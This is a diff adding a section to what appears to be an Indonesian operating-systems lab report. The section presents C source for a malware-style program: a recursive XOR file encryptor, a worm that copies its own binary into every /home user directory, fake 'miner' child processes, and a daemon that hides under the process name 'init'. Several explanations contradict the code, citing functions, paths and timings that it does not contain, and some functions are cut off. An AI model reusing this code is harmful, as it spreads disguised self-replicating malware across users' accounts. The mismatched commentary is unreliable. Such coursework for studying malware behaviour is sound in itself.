@@ -502,6 +502,200 @@ Isi file `activity.log`:
 
 ![Capture6](https://github.com/user-attachments/assets/b15fa14e-071f-4539-8099-00c427f0bdce)
 
+# Soal 3
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <time.h>
+#include <string.h>
+#include <dirent.h>
+#include <sys/prctl.h>
+#include <sys/wait.h>
+#include <signal.h>
+```
+Ini kumpulan library standar C untuk: IO (stdio.h), manipulasi file & direktori (unistd.h, sys/stat.h, fcntl.h, dirent.h), proses (sys/types.h, sys/wait.h, signal.h), operasi random & waktu (time.h), set nama proses (prctl.h)
+
+```
+void xor_encrypt_file(const char *filepath) {
+    int fd = open(filepath, O_RDWR);
+    if (fd < 0) return;
+
+    char buf[1024];
+    ssize_t n;
+    while ((n = read(fd, buf, sizeof(buf))) > 0) {
+        for (ssize_t i = 0; i < n; i++) buf[i] ^= ENCRYPTION_KEY;
+        lseek(fd, -n, SEEK_CUR);
+        write(fd, buf, n);
+    }
+
+    close(fd);
+}
+```
+Membuka file filepath dengan mode baca/tulis (rb+), membaca byte demi byte, menggeser pointer mundur 1 byte (fseek(f, -1, SEEK_CUR)) menulis byte hasil XOR dengan key sehingga file dienkripsi (atau didekripsi) pakai XOR key sederhana.
+```
+void recursive_encrypt(const char *dirpath) {
+    DIR *dir = opendir(dirpath);
+    if (!dir) return;
+
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
+
+        char path[1024];
+        snprintf(path, sizeof(path), "%s/%s", dirpath, entry->d_name);
+
+        struct stat st;
+        if (stat(path, &st) == -1) continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            recursive_encrypt(path);
+        } else if (S_ISREG(st.st_mode)) {
+            xor_encrypt_file(path);
+        }
+    }
+
+    closedir(dir);
+}
+```
+Membuka folder path, rekursif dan jika ketemu subfolder -> masuk ke dalam, untuk setiap file akan panggil xor_file agar Mengenkripsi semua file di dalam folder (dan subfolder) tertentu.
+```
+void trojan_worm() {
+    DIR *home = opendir("/home");
+    if (!home) return;
+
+    struct dirent *entry;
+    while ((entry = readdir(home)) != NULL) {
+        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
+
+        char dirpath[1024];
+        snprintf(dirpath, sizeof(dirpath), "/home/%s", entry->d_name);
+
+        struct stat st;
+        if (stat(dirpath, &st) == -1 || !S_ISDIR(st.st_mode)) continue;
+
+        char dest[1024];
+        snprintf(dest, sizeof(dest), "%s/%s", dirpath, SELF_NAME);
+
+        int src = open(SELF_NAME, O_RDONLY);
+        if (src < 0) continue;
+
+        int dst = open(dest, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+        if (dst < 0) {
+            close(src);
+            continue;
+        }
+
+        char buf[1024];
+        ssize_t n;
+        while ((n = read(src, buf, sizeof(buf))) > 0) write(dst, buf, n);
+
+        close(src);
+        close(dst);
+    }
+
+    closedir(home);
+}
+```
+Membuka /home directory, untuk setiap user (kecuali . dan ..), membuat file /home/{user}/runme, menyalin binary dirinya sendiri (/proc/self/exe) ke file itu agar menyebarkan diri ke setiap user di sistem dengan nama file runme.
+
+```
+void miner_child(int index) {
+    srand(time(NULL) + index);
+    char hash[65];
+    for (int i = 0; i < 64; i++)
+        hash[i] = "abcdef0123456789"[rand() % 16];
+    hash[64] = '\0';
+
+    FILE *log = fopen(MINER_LOG, "a");
+    if (log) {
+        time_t now = time(NULL);
+        struct tm *tm = localtime(&now);
+        fprintf(log, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %d] %s\n",
+                tm->tm_year+1900, tm->tm_mon+1, tm->tm_mday,
+                tm->tm_hour, tm->tm_min, tm->tm_sec,
+                index, hash);
+        fclose(log);
+    }
+
+    char name[64];
+    snprintf(name, sizeof(name), "mine-crafter-%02d", index);
+    prctl(PR_SET_NAME, name, 0, 0, 0);
+
+    while (1) sleep(60);
+```
+Mengatur nama proses menjadi mine-crafter-{id} (pakai prctl), generate string hash palsu acak (hexadecimal 64 karakter), menulis log ke /tmp/.miner.log dengan timestamp dan hash, tidur 3–30 detik sebelum generate berikutnya seolah-olah proses ini mining crypto, padahal hanya spam log file.
+
+```
+void run_miners() {
+    for (int i = 0; i < MAX_MINERS; i++) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            miner_child(i);
+            exit(0);
+        }
+    }
+}
+```
+Membuat maksimal 5 child process, setiap child jalanin mine_crafter, setiap child tidur sebentar (sleep(1)) sebelum fork berikutnya sehingga sistem resource pelan-pelan termakan, tapi dibatasi supaya tidak langsung crash.
+```
+void daemonize() {
+    pid_t pid = fork();
+    if (pid > 0) exit(0); // Parent exits
+
+    setsid(); // New session
+    chdir("/");
+
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+```
+Berfungsi agar program jalan di background tanpa terdeteksi di terminal
+```
+int main() {
+    daemonize();
+    prctl(PR_SET_NAME, "init", 0, 0, 0); 
+
+    while (1) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            recursive_encrypt("/tmp/sisop/test"); 
+            exit(0);
+        }
+
+        pid = fork();
+        if (pid == 0) {
+            trojan_worm();
+            exit(0);
+        }
+
+        pid = fork();
+        if (pid == 0) {
+            run_miners();
+            exit(0);
+        }
+        int status;
+        while (wait(&status) > 0); 
+
+        sleep(INTERVAL);
+    }
+
+    return 0;
+}
+
+```
+daemonize() — membuat proses jadi daemon, generate random key dari time(NULL), unzip_file() — ekstrak starter kit.
+
+Infinite loop:
+
+- Mengenkripsi semua file di /home/user/sisop/test pakai encryptor.
+- Menyebarkan trojan ke home user (trojan()).
+- Melakukan limited fork bomb (forkbomb()).
+- Tidur 30 detik.
+
 # Soal 4
 a. Mengetahui semua aktivitas user
 ```c
